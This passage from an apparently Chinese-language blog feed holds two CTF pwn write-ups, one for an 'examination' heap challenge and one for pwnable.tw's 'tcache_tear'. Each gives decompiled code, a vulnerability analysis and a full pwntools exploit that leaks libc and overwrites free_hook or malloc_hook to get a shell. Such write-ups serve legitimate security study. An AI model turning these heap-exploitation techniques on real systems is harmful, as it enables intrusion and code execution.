class="number">00000000</span> info            struc ; (<span class="keyword">sizeof</span>=<span class="number">0x14</span>, mappedto_9)					/chunksize=<span class="number">0x31</span></span><br><span class="line"><span class="number">00000000</span> nums_qestion    dd ?</span><br><span class="line"><span class="number">00000004</span> score           dd ?</span><br><span class="line"><span class="number">00000008</span> comment         dq ?                    ; offset</span><br><span class="line"><span class="number">00000010</span> size            dd ?</span><br><span class="line"><span class="number">00000014</span> info            ends</span><br><span class="line"><span class="number">00000014</span></span><br></pre></td></tr></table></figure>

<p>按照惯例，我们首先要看的就是对于堆块的输入是否存在着溢出，</p>
<p>在teacher模式下，可以写commend，但是因为要求你写入size，并根据size大小calloc，这里目前是不存在溢出的</p>
<p>另外一个是在student模式下set mode，这里calloc 0x20大小的chunk，然后读入0X20数据，也不存在溢出。</p>
<p>但是我们审计这里发现，判断程序是进行读入mode还是预测pray score，是根据student结构体中的type判断，而type又可以利用pray进行操作，type^&#x3D;1。同时pray sore 保存的地址与mode保存地址一致。所以这里存在任意地址写。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">set_mode</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  student *v1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+14h] [rbp-1Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( nlist[a1]-&gt;Type != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !nlist[a1]-&gt;mode )</span><br><span class="line">    &#123;</span><br><span class="line">      v1 = nlist[a1];</span><br><span class="line">      v1-&gt;mode = <span class="built_in">calloc</span>(<span class="number">1uLL</span>, <span class="number">0x20</span>uLL);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;enter your mode!&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, nlist[a1]-&gt;mode, <span class="number">0x20</span>uLL);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;enter your pray score: 0 to 100&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v3);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &gt;= <span class="number">0</span> &amp;&amp; v3 &lt;= <span class="number">100</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    LOBYTE(nlist[a1]-&gt;mode) = v3;</span><br><span class="line">LABEL_9:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;finish&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;bad!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> __fastcall <span class="title function_">pray</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;prayer...Good luck to you&quot;</span>);</span><br><span class="line">  nlist[a1]-&gt;Type ^= <span class="number">1u</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;finish&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当我们继续继续审计代码，发现student的check rewiew 存在任意地址加一。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">checkfor_rewiew</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE *v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> address[<span class="number">24</span>]; <span class="comment">// [rsp+20h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( nlist[a1]-&gt;win == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;already gained the reward!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( nlist[a1]-&gt;stu-&gt;score &gt; <span class="number">0x59</span>u )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Good Job! Here is your reward! %p\n&quot;</span>, nlist[a1]);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;add 1 to wherever you want! addr: &quot;</span>);<span class="comment">// 任意地址加1</span></span><br><span class="line">      read_addr(<span class="number">0</span>, address, <span class="number">16</span>);</span><br><span class="line">      v1 = (_BYTE *)atol(address);</span><br><span class="line">      ++*v1;</span><br><span class="line">      nlist[a1]-&gt;win = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( nlist[a1]-&gt;stu-&gt;comment )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;here is the review:&quot;</span>);</span><br><span class="line">      write(<span class="number">1</span>, nlist[a1]-&gt;stu-&gt;comment, nlist[a1]-&gt;stu-&gt;size);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;no reviewing yet!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看到这里时，我有想到将student comment的size进行加一，或者将student win加（但是没啥用好像）。</p>
<p>再来，我们还需要关注free，程序只给了我们三次机会，而且只是将list中保留的student结构体指针清空，而没有清空其他的数据。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;which student id to choose?&quot;</span>);</span><br><span class="line">      read(<span class="number">0</span>, buf, <span class="number">5uLL</span>);</span><br><span class="line">      idx = atoi(buf);</span><br><span class="line">      <span class="keyword">if</span> ( idx &gt;= <span class="number">0</span> &amp;&amp; idx &lt;= <span class="number">9</span> &amp;&amp; nlist[idx] )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;bad luck for student %d! Say goodbye to him/her!&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)idx);</span><br><span class="line">        <span class="keyword">if</span> ( nlist[idx]-&gt;stu-&gt;message )</span><br><span class="line">          <span class="built_in">free</span>(nlist[idx]-&gt;stu-&gt;message);</span><br><span class="line">        <span class="built_in">free</span>(nlist[idx]-&gt;stu);</span><br><span class="line">        <span class="built_in">free</span>(nlist[idx]);</span><br><span class="line">        nlist[idx] = <span class="number">0LL</span>;</span><br><span class="line">        --count;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

<p>接下来思考程序对于堆块数据的输出。只有在student 模式的check review 可以输出comment。</p>
<h2 id="着手漏洞"><a href="#着手漏洞" class="headerlink" title="着手漏洞"></a>着手漏洞</h2><h3 id="泄露地址"><a href="#泄露地址" class="headerlink" title="泄露地址"></a>泄露地址</h3><p>check review 有机会直接输出student的地址，但是分数需要够96,但是正常情况下是不可以的，因为question只能是0~6，但是我们发现，如果学生进行过pre，再次打分，就会被扣10分，而且数据比较的时候是无符号数，所以只要question数为1，在pray，被扣10分就会成为一个大数。输出chunk的地址。这里也解决了一个问题就是，因为我们释放次数有限，而且堆块大小也不可以超过0x3ff，free后chunk全部进入tcache，没法泄露libc，所以我们利用任意地址（一字节的数据类型）加1，可以将一个chunk变得很大，free后就可以进入unsortedbin，后面可以申请出来，即使tcache,存在，也会优先使用unsortedbin.所以我们只要后面write review的时候，size&lt;&#x3D;8,就可以保留bk指针不被修改。但是这里我们可以用更简单的方式，直接将size变得更大，（两个方法都要修改保存的comment size），直接越界输出main_arena。</p>
<p>后面就是一个常规的想法，因为chunk上有comment的指针，所以我们利用上面的溢出，将指针改写为free_hook，然后再编辑该review，把onegadget写入。最后free实际就是调用execve().</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>  *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">r= process(<span class="string">&#x27;./examination&#x27;</span>)</span><br><span class="line">elf =ELF(<span class="string">&#x27;examination&#x27;</span>)</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ch</span>(<span class="params">i</span>):</span><br><span class="line">        r.sendlineafter(<span class="string">&quot;choice&gt;&gt;&quot;</span>,<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">changerole</span>(<span class="params">i</span>):</span><br><span class="line">        ch(<span class="number">5</span>)</span><br><span class="line">        r.sendlineafter(<span class="string">&quot;role:&quot;</span>,<span class="built_in">str</span>(i))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">givescore</span>():</span><br><span class="line">        ch(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addstudent</span>(<span class="params">i</span>):</span><br><span class="line">        ch(<span class="number">1</span>)</span><br><span class="line">        r.sendlineafter(<span class="string">&quot;questions:&quot;</span>,<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">writereview</span>(<span class="params">idx,size,text</span>):</span><br><span class="line">        ch(<span class="number">3</span>)</span><br><span class="line">        r.sendlineafter(<span class="string">&quot;one&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">        <span class="keyword">if</span> size:</span><br><span class="line">                r.sendlineafter(<span class="string">&quot;comment&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(text)==size:</span><br><span class="line">               r.sendafter(<span class="string">&quot;comment&quot;</span>,text)</span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">                 r.sendlineafter(<span class="string">&quot;comment&quot;</span>,text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">callparent</span>(<span class="params">idx</span>):</span><br><span class="line">        ch(<span class="number">4</span>)</span><br><span class="line">        r.sendlineafter(<span class="string">&quot;choose&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pray</span>():</span><br><span class="line">        ch(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setmode</span>(<span class="params">text</span>):</span><br><span class="line">        ch(<span class="number">4</span>)</span><br><span class="line">        r.sendafter(<span class="string">&quot;mode&quot;</span>,text+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pray_score</span>(<span class="params">num</span>):</span><br><span class="line">        ch(<span class="number">4</span>)</span><br><span class="line">        r.sendlineafter(<span class="string">&quot;score&quot;</span>,<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">changeid</span>(<span class="params">i</span>):</span><br><span class="line">        ch(<span class="number">6</span>)</span><br><span class="line">        r.sendlineafter(<span class="string">&quot;id&quot;</span>,<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak heap_addr</span></span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">addstudent(<span class="number">1</span>)</span><br><span class="line">givescore()</span><br><span class="line">writereview(<span class="number">0</span>,<span class="number">0x310</span>,<span class="string">&quot;aaaaaaa&quot;</span>)</span><br><span class="line">changerole(<span class="number">1</span>)</span><br><span class="line">pray()</span><br><span class="line">changerole(<span class="number">0</span>)</span><br><span class="line">addstudent(<span class="number">1</span>)</span><br><span class="line">pad = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0xa0</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x271</span>)+<span class="string">b&#x27;AAAAAAAA&#x27;</span></span><br><span class="line"></span><br><span class="line">writereview(<span class="number">1</span>,<span class="number">0x310</span>,<span class="string">&quot;aaaaaaaa&quot;</span>)</span><br><span class="line"></span><br><span class="line">addstudent(<span class="number">1</span>)</span><br><span class="line">writereview(<span class="number">2</span>,<span class="number">0x310</span>,pad)</span><br><span class="line">addstudent(<span class="number">1</span>)</span><br><span class="line">writereview(<span class="number">3</span>,<span class="number">0x20</span>,<span class="string">&quot;bbbbbbbb&quot;</span>)</span><br><span class="line">changerole(<span class="number">1</span>)</span><br><span class="line">changeid(<span class="number">1</span>)</span><br><span class="line">pray()</span><br><span class="line">changeid(<span class="number">2</span>)</span><br><span class="line">pray()</span><br><span class="line">changeid(<span class="number">3</span>)</span><br><span class="line">pray()</span><br><span class="line">changerole(<span class="number">0</span>)</span><br><span class="line">givescore()</span><br><span class="line">changerole(<span class="number">1</span>)</span><br><span class="line">ch(<span class="number">2</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Good Job! Here is your reward! &quot;</span>)</span><br><span class="line">heap_addr = <span class="built_in">int</span>(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)-<span class="number">0x10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;heap_addr : &quot;</span>,<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">aimed = (heap_addr+<span class="number">0x3c9</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;aimed : &quot;</span>,<span class="built_in">hex</span>(aimed))</span><br><span class="line">r.sendafter(<span class="string">&quot;addr&quot;</span>,<span class="string">&quot;00&quot;</span>+<span class="built_in">str</span>(aimed))</span><br><span class="line"></span><br><span class="line"><span class="comment">#new student ,free to tcaceh </span></span><br><span class="line">r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">changerole(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">callparent(<span class="number">1</span>)</span><br><span class="line">addstudent(<span class="number">1</span>)</span><br><span class="line">writereview(<span class="number">3</span>,<span class="number">0x18</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">changerole(<span class="number">1</span>)</span><br><span class="line">changeid(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">ch(<span class="number">2</span>)</span><br><span class="line">aimed = heap_addr+<span class="number">0x411</span></span><br><span class="line">r.sendafter(<span class="string">&quot;addr&quot;</span>,<span class="string">&quot;00&quot;</span>+<span class="built_in">str</span>(aimed))</span><br><span class="line">changeid(<span class="number">3</span>)</span><br><span class="line">ch(<span class="number">2</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">6</span>)</span><br><span class="line">libcbase = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1ecbe0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc : &quot;</span>,<span class="built_in">hex</span>(libcbase))</span><br><span class="line">environ =libcbase- <span class="number">0x1ef600</span></span><br><span class="line">malloc_hook = libcbase + <span class="number">0x1ecb70</span></span><br><span class="line">free_hook = libcbase +  <span class="number">0x1eee48</span></span><br><span class="line">onegadget = libcbase + <span class="number">0xe3b31</span></span><br><span class="line"><span class="comment">#onegadget = 0xcafebabedeadbeef</span></span><br><span class="line">changerole(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#we have already leak the libc address,</span></span><br><span class="line"><span class="comment">#but next how can we realize write anywhere</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">addstudent(<span class="number">1</span>)</span><br><span class="line">writereview(<span class="number">4</span>,<span class="number">0x10</span>,<span class="string">&quot;CCCC&quot;</span>)</span><br><span class="line">pad =  <span class="string">b&#x27;x&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x31</span>)</span><br><span class="line">pad += p64(heap_addr+<span class="number">0x470</span>)+p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">pad += p64(<span class="number">0x21</span>)+p64(<span class="number">1</span>)+p64(free_hook)</span><br><span class="line">writereview(<span class="number">3</span>,<span class="number">0</span>,pad)</span><br><span class="line">writereview(<span class="number">4</span>,<span class="number">0</span>,p64(onegadget))</span><br><span class="line">callparent(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>tcache_tear</title>
    <url>/2022/04/01/tcache-tear/</url>
    <content><![CDATA[<h1 id="pwnable-tw-tcache-tear"><a href="#pwnable-tw-tcache-tear" class="headerlink" title="pwnable.tw     tcache_tear"></a>pwnable.tw     tcache_tear</h1><h2 id="保护："><a href="#保护：" class="headerlink" title="保护："></a>保护：</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">dreamcat@ubuntu:~/Desktop/pwnable/Tcache Tear$ checksec --file=tcache_tear</span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE</span><br><span class="line">Full RELRO      Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols	  Yes	<span class="number">1</span>		<span class="number">2</span>		tcache_tear</span><br><span class="line">dreamcat@ubuntu:~/Desktop/pwnable/Tcache Tear$ strings libc<span class="number">-2.27</span>.so | grep ubuntu</span><br><span class="line">GNU C Library (Ubuntu GLIBC <span class="number">2.27</span><span class="number">-3u</span>buntu1) stable release version <span class="number">2.27</span>.</span><br><span class="line">&lt;https:<span class="comment">//bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>64位程序，FULLrelro导致不能改写got</p>
<p>但是因为这个libc版本太老，tcache 不会检查double free</p>
<h2 id="主要程序："><a href="#主要程序：" class="headerlink" title="主要程序："></a>主要程序：</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  sub_400948(a1, a2, a3);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Name:&quot;</span>);</span><br><span class="line">  read_name((__int64)&amp;name, <span class="number">0x20</span>u);</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      v3 = get_num();</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v4 &lt;= <span class="number">7</span> )                            <span class="comment">// 限制释放次数</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">free</span>(ptr);</span><br><span class="line">        ++v4;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        info();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v3 == <span class="number">4</span> )</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">LABEL_14:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">      add();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>只允许8次free，而且还有tcache，ptr指针存在uaf，但是没有编辑函数，输出的是name，对于name输入输出限制大小都在0x20没有溢出以及泄露ptr的可能。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> size; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Size:&quot;</span>);</span><br><span class="line">  v0 = get_num();</span><br><span class="line">  size = v0;</span><br><span class="line">  <span class="keyword">if</span> ( v0 &lt;= <span class="number">0xFF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    ptr = <span class="built_in">malloc</span>(v0);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Data:&quot;</span>);</span><br><span class="line">    read_name((__int64)ptr, size - <span class="number">16</span>);         <span class="comment">// 溢出</span></span><br><span class="line">    LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">&quot;Done !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>add 读入数据时存在数字类型转换溢出，当size&lt;16时，读入非常大的数据，可以覆盖topchunk </p>
<h2 id="loading"><a href="#loading" class="headerlink" title="loading:"></a>loading:</h2><p>1：最主要的问题，如何泄露libc的地址。尝试攻击stdout结构体</p>
<p>largebin 不走tcache，但是走unsortedbin，所以伪造fakechunk 进sortedbin，低版本的libc2.27可以tcache double free,很容易拿到name，并且实现超长数据写（size&lt;16)</p>
<p>我们将name伪造成largechunk，free后进unsortedbins，泄露libc，然后同样手法修改malloc_hook，这次需要realloc调栈</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#r=process(&#x27;./tcache_tear&#x27;)</span></span><br><span class="line">r=remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10207</span>)</span><br><span class="line">elf =ELF(<span class="string">&#x27;./tcache_tear&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line">name=<span class="number">0x602060</span></span><br><span class="line"><span class="comment">#fake chunksize 0x91,name size is 0x20</span></span><br><span class="line"></span><br><span class="line">gp = <span class="number">0x602088</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ch</span>(<span class="params">i</span>):</span><br><span class="line">	r.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,text</span>):</span><br><span class="line">	ch(<span class="number">1</span>)</span><br><span class="line">	r.sendlineafter(<span class="string">&quot;Size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	r.sendlineafter(<span class="string">&quot;Data:&quot;</span>,text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>():</span><br><span class="line">	ch(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r,&#x27;b malloc&#x27;)</span></span><br><span class="line">offset = gp-name</span><br><span class="line">fakechunk=p64(<span class="number">0x602060</span>)+p64(<span class="number">0x501</span>)</span><br><span class="line">fakechunk +=<span class="string">b&#x27;\x00&#x27;</span>*(offset-<span class="number">0x10</span>)+p64(name+<span class="number">0x10</span>)+<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x602560</span>-<span class="number">0x602090</span>+<span class="number">8</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">fakechunk +=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x18</span> + p64(<span class="number">0x21</span>)</span><br><span class="line">r.sendafter(<span class="string">&quot;Name:&quot;</span>,p64(<span class="number">0x602060</span>))</span><br><span class="line">add(<span class="number">10</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">free()</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">10</span>,p64(name))</span><br><span class="line">add(<span class="number">10</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">10</span>,fakechunk)</span><br><span class="line">free()</span><br><span class="line">ch(<span class="number">3</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;\x05&quot;</span>)</span><br><span class="line">r.recv(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">main_addr_96 = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">malloc_hook = main_addr_96-<span class="number">0x70</span></span><br><span class="line">realloc_hook = malloc_hook-<span class="number">0x8</span></span><br><span class="line">libcbase = main_addr_96 - <span class="number">0x3ebca0</span> </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc : &quot;</span>,<span class="built_in">hex</span>(libcbase))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;malloc_hook : &quot;</span>,<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line"></span><br><span class="line">onegadget = <span class="number">0xcafebabedeadbeef</span></span><br><span class="line">onegadget = libcbase +<span class="number">0x010a38c</span></span><br><span class="line">realloc = libcbase + libc.sym[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;realloc _: &quot;</span>,<span class="built_in">hex</span>(realloc))</span><br><span class="line">add(<span class="number">10</span>,p64(malloc_hook-<span class="number">8</span>))</span><br><span class="line">add(<span class="number">10</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">add(<span class="number">10</span>,p64(onegadget)+p64(realloc+<span class="number">6</span>))</span><br><span class="line">ch(<span class="number">1</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;10&quot;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
</search>
